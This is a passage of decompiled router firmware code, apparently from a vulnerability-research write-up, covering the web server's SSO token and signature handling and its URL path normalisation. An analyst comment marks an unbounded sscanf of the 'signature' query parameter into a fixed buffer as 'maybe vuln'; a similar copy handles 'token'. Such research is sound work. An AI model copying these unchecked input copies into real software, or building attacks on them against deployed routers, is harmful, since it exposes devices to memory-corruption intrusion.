class="string">&quot;Location: setup.cgi?next_file=%s&amp;timestamp=%d&quot;</span>, <span class="string">&quot;BRS_sso_fail_msg.html&quot;</span>, optlen);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        optlena = getpid();</span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&amp;timestamp=%d&quot;</span>, <span class="string">&quot;BRS_sso_status.html&quot;</span>, optlena);</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_335:</span><br><span class="line">      v17 = <span class="number">302</span>;</span><br><span class="line">      v19 = v230;</span><br><span class="line">      v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">      v20 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v109 = path;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;?error_code=2200&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v110 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v110)</span><br><span class="line">      &amp;&amp; !v102</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">      &amp;&amp; !dword_42C9D8 )</span><br><span class="line">    &#123;</span><br><span class="line">      nvram_set(<span class="string">&quot;RAE_ssoGuiRegStatus&quot;</span>, <span class="string">&quot;Already register by other SSO&quot;</span>);</span><br><span class="line">      v111 = nvram_get(<span class="string">&quot;sso_first_time&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v111 )</span><br><span class="line">        v111 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v112 = <span class="string">&quot;sso_first_time&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v111 == <span class="number">48</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v113 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_322;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_323;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v109, <span class="string">&quot;?signature=&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v114 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v114)</span><br><span class="line">      &amp;&amp; !v102</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">      &amp;&amp; !dword_42C9D8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v225 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(v226, <span class="number">0</span>, <span class="keyword">sizeof</span>(v226));</span><br><span class="line">      <span class="built_in">memset</span>(v229, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">      sc_get_sn(&amp;v225, <span class="number">43</span>);</span><br><span class="line">      v226[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">      v115 = <span class="built_in">strstr</span>(path, <span class="string">&quot;?signature=&quot;</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(v115 + <span class="number">11</span>, <span class="string">&quot;%s&quot;</span>, v229);            <span class="comment">// maybe vuln</span></span><br><span class="line">      <span class="keyword">if</span> ( isProductRegistered(&amp;v225, v229) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        nvram_set(<span class="string">&quot;sso_first_time&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        v116 = <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        nvram_set(<span class="string">&quot;sso_first_time&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">        v116 = <span class="string">&quot;No&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      nvram_set(<span class="string">&quot;RAE_devRegisterStatus&quot;</span>, v116);</span><br><span class="line">      nvram_commit();</span><br><span class="line">      system(<span class="string">&quot;/usr/bin/killall -SIGUSR1 sso_deamon&quot;</span>);</span><br><span class="line">      v117 = dword_42C88C;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">        v117 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">      dword_42C88C = v117;</span><br><span class="line">      <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&quot;</span>, <span class="string">&quot;index.htm&quot;</span>);</span><br><span class="line">      v17 = <span class="number">302</span>;</span><br><span class="line">      v19 = v230;</span><br><span class="line">      v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_427;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v109, <span class="string">&quot;?token=&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v118 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v118)</span><br><span class="line">      &amp;&amp; !v102</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">      &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">      &amp;&amp; !dword_42C9D8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v225 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(v226, <span class="number">0</span>, <span class="keyword">sizeof</span>(v226));</span><br><span class="line">      <span class="built_in">memset</span>(v228, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">      v229[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      v229[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      v229[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">      v229[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">      LOBYTE(v229[<span class="number">4</span>]) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(v227, <span class="number">0</span>, <span class="keyword">sizeof</span>(v227));</span><br><span class="line">      sc_get_sn(&amp;v225, <span class="number">43</span>);</span><br><span class="line">      v226[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">      v119 = nvram_get(<span class="string">&quot;sso_cur_sessionId&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v119 )</span><br><span class="line">        v119 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="built_in">snprintf</span>(v229, <span class="number">0x11</span>u, <span class="string">&quot;%s&quot;</span>, v119);</span><br><span class="line">      v120 = <span class="built_in">strstr</span>(path, <span class="string">&quot;?token=&quot;</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(v120 + <span class="number">7</span>, <span class="string">&quot;%s&quot;</span>, v228);</span><br><span class="line">      v121 = nvram_get(<span class="string">&quot;sso_first_time&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v121 )</span><br><span class="line">        v121 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v121 == <span class="number">48</span> )</span><br><span class="line">        nvram_set(<span class="string">&quot;sso_first_time&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      v112 = <span class="string">&quot;RAE_ssoGuiRegStatus&quot;</span>;</span><br><span class="line">      v113 = <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">LABEL_322:</span><br><span class="line">      nvram_set(v112, v113);</span><br><span class="line">LABEL_323:</span><br><span class="line">      nvram_set(<span class="string">&quot;sso_from_internet&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">      nvram_commit();</span><br><span class="line">      v122 = dword_42C88C;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">        v122 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">      dword_42C88C = v122;</span><br><span class="line">      v123 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v123 )</span><br><span class="line">        v123 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v123 == <span class="number">98</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&quot;</span>, <span class="string">&quot;BRS_sso_success.html&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v124 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v124 )</span><br><span class="line">          v124 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *v124 == <span class="number">99</span> )</span><br><span class="line">          v125 = <span class="string">&quot;BRS_netgear_success.html&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v125 = <span class="string">&quot;index.htm&quot;</span>;</span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&quot;</span>, v125);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_335;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v126 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v126 )</span><br><span class="line">    v126 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v126 != <span class="number">98</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v127 = nvram_get(<span class="string">&quot;sso_skip&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v127 )</span><br><span class="line">      v127 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v127 == <span class="number">48</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v128 = nvram_get(<span class="string">&quot;sso_first_time&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v128 )</span><br><span class="line">        v128 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v128 == <span class="number">48</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v129 = nvram_get(<span class="string">&quot;internet_ok&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v129 )</span><br><span class="line">          v129 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *v129 == <span class="number">49</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v130 = nvram_get(<span class="string">&quot;mandate_sso&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v130 )</span><br><span class="line">            v130 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          <span class="keyword">if</span> ( *v130 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">          &#123;</span><br><span class="line">            v131 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !strcasecmp(v11, v131) &amp;&amp; !v102 )</span><br><span class="line">            &#123;</span><br><span class="line">              v132 = path;</span><br><span class="line">              <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;.ico&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;sso_wait.html&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;BRS_sso_hijack.html&quot;</span>)</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;sso_fail&quot;</span>)</span><br><span class="line">                &amp;&amp; !dword_42C9D8</span><br><span class="line">                &amp;&amp; !<span class="built_in">strstr</span>(v132, <span class="string">&quot;PWD_secure.htm&quot;</span>) )</span><br><span class="line">              &#123;</span><br><span class="line">                v133 = dword_42C88C;</span><br><span class="line">                <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">                  v133 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">                dword_42C88C = v133;</span><br><span class="line">                <span class="built_in">snprintf</span>(v229, <span class="number">0x64</span>u, <span class="string">&quot;Location:setup.cgi?next_file=%s&quot;</span>, <span class="string">&quot;sso_wait.html&quot;</span>);</span><br><span class="line">LABEL_426:</span><br><span class="line">                v17 = <span class="number">302</span>;</span><br><span class="line">                v19 = v229;</span><br><span class="line">                v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">LABEL_427:</span><br><span class="line">                v20 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v134 = nvram_get(<span class="string">&quot;openvpn_hijack&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v134 )</span><br><span class="line">    v134 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v134 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v135 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v135) &amp;&amp; !v102 )</span><br><span class="line">    &#123;</span><br><span class="line">      v136 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v136, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">        &amp;&amp; !dword_42C9D8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v137 = dword_42C88C;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">          v137 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">        dword_42C88C = v137;</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v229,</span><br><span class="line">          <span class="number">0x64</span>u,</span><br><span class="line">          <span class="string">&quot;Location: http://www.routerlogin.net/setup.cgi?next_file=%s&quot;</span>,</span><br><span class="line">          <span class="string">&quot;openvpn_confirm_update.htm&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_426;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v138 = nvram_get(<span class="string">&quot;tc_from_old&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v138 )</span><br><span class="line">    v138 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v138 == <span class="number">49</span> &amp;&amp; !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v139 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v139) &amp;&amp; !v102 )</span><br><span class="line">    &#123;</span><br><span class="line">      v140 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strstr</span>(v140, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">        &amp;&amp; !dword_42C9D8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v141 = dword_42C88C;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">          v141 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">        dword_42C88C = v141;</span><br><span class="line">        <span class="built_in">snprintf</span>(v229, <span class="number">0x64</span>u, <span class="string">&quot;Location: %s&quot;</span>, <span class="string">&quot;tc_exist_unit_hijack.htm&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_426;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v142 = nvram_get(<span class="string">&quot;weak_password_check&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v142 )</span><br><span class="line">    v142 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v142 == <span class="number">49</span> &amp;&amp; access(<span class="string">&quot;/tmp/no_security_page&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v143 = nvram_get(<span class="string">&quot;user_ignore_weak_pw&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v143 )</span><br><span class="line">      v143 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v143 != <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v144 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v144 )</span><br><span class="line">        v144 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v144 != <span class="number">98</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v145 = path;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;PWD_secure.htm&quot;</span>) &amp;&amp; !do_ssl )</span><br><span class="line">        &#123;</span><br><span class="line">          v146 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !strcasecmp(v11, v146)</span><br><span class="line">            &amp;&amp; !v102</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>(v145, <span class="string">&quot;top.htm&quot;</span>)</span><br><span class="line">            &amp;&amp; !dword_42C9D8 )</span><br><span class="line">          &#123;</span><br><span class="line">            v147 = dword_42C88C;</span><br><span class="line">            <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">              v147 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">            dword_42C88C = v147;</span><br><span class="line">            <span class="built_in">snprintf</span>(v229, <span class="number">0x64</span>u, <span class="string">&quot;Location: %s&quot;</span>, <span class="string">&quot;PWD_secure.htm&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_426;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v148 = path;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;.cgi&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(v148, <span class="string">&quot;.htm&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v148, <span class="string">&quot;shares&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v149 = <span class="built_in">strlen</span>(v148);</span><br><span class="line">    <span class="keyword">if</span> ( v149 &gt;= <span class="number">0x1E2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">404</span>;</span><br><span class="line">      v18 = &amp;unk_415C74;</span><br><span class="line">      v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v20 = <span class="string">&quot;No such file.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">    strlcpy(byte_42C9E0, v148, v149 - <span class="number">8</span>);</span><br><span class="line">    v150 = <span class="built_in">strrchr</span>(byte_42C9E0, <span class="number">47</span>);</span><br><span class="line">    strlcpy(byte_42CBF4, byte_42C9E0, v150 - byte_42C9E0);</span><br><span class="line">    v151 = path;</span><br><span class="line">    <span class="keyword">if</span> ( *path == <span class="number">47</span> )</span><br><span class="line">      path = v151 + <span class="built_in">strlen</span>(byte_42CBF4) + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;%s/setup.cgi?next_file=%s&quot;</span>, byte_42CBF4, path);</span><br><span class="line">    path = byte_42C9E0;</span><br><span class="line">  &#125;</span><br><span class="line">  v152 = path;</span><br><span class="line">  path = v152 + <span class="built_in">strspn</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  v153 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  dword_42C88C = v153;</span><br><span class="line">  v17 = <span class="number">400</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v153 )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_438;</span><br><span class="line">  &#125;</span><br><span class="line">  *v153 = <span class="number">0</span>;</span><br><span class="line">  dword_42C88C = (v153 + <span class="number">1</span>);</span><br><span class="line">  v154 = <span class="built_in">strchr</span>(path, <span class="number">63</span>);</span><br><span class="line">  dword_42C888 = v154;</span><br><span class="line">  <span class="keyword">if</span> ( v154 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v154 = <span class="number">0</span>;</span><br><span class="line">    v155 = v154 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v155 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_42C888 = v155;</span><br><span class="line">  v156 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(v11, v156) )</span><br><span class="line">  &#123;</span><br><span class="line">    v157 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v158 = sub_405EE4(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v158) )</span><br><span class="line">    &#123;</span><br><span class="line">      v157 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v159 = sub_405EE4(<span class="number">3</span>);</span><br><span class="line">      v160 = strcasecmp(v11, v159) != <span class="number">0</span>;</span><br><span class="line">      v157 = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v160 )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">501</span>;</span><br><span class="line">        v18 = <span class="string">&quot;Not Implemented&quot;</span>;</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v20 = <span class="string">&quot;That method is not implemented.&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v161 = path;</span><br><span class="line">  dword_42C87C = v157;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;%00&quot;</span>) || (sub_406AF0(v161, v161), v162 = path, *path != <span class="number">47</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">400</span>;</span><br><span class="line">    v18 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v20 = <span class="string">&quot;Bad filename.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  v163 = path + <span class="number">1</span>;</span><br><span class="line">  dword_42C880 = path + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v166 = <span class="built_in">strstr</span>(v162 + <span class="number">1</span>, <span class="string">&quot;//&quot;</span>);</span><br><span class="line">    v167 = v166;</span><br><span class="line">    <span class="keyword">if</span> ( !v166 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = v166 + <span class="number">2</span>; *j == <span class="number">47</span>; ++j )</span><br><span class="line">      ;</span><br><span class="line">    src = j;</span><br><span class="line">    v165 = <span class="built_in">strlen</span>(j);</span><br><span class="line">    memmove(v167 + <span class="number">1</span>, src, v165 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">strncmp</span>(v162 + <span class="number">1</span>, <span class="string">&quot;./&quot;</span>, <span class="number">2u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v168 = <span class="built_in">strlen</span>(v162 + <span class="number">3</span>);</span><br><span class="line">    memmove((v162 + <span class="number">1</span>), v162 + <span class="number">3</span>, v168 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v170 = <span class="built_in">strstr</span>(v162 + <span class="number">1</span>, <span class="string">&quot;/./&quot;</span>);</span><br><span class="line">    v171 = v170;</span><br><span class="line">    <span class="keyword">if</span> ( !v170 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    src = v170 + 